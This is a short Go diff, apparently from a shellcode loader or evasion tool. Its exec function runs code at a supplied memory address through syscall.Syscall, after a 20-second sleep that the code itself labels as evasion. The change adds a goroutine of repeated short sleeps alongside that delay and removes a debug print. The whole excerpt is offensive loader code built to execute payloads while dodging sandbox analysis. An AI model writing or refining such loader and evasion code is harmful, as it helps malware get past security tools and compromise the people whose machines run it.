@@ -262,9 +262,14 @@ func exec(startA uintptr,funcExec string){
 	switch funcExec {
 	case "syscall":
 		fmt.Println("Sleep 20s for evasion...")
+		go func(){
+			for i := 0; i < 100 ;i++{
+				fmt.Println("Sleep 20s for evasion...")
+				windows.SleepEx(100,false)
+			}
+		}()
 		windows.SleepEx(20000,false)
 
-		fmt.Println("syscall.Syscall")
 		syscall.Syscall(startA,0,0,0,0)
 
 	case "createthread":
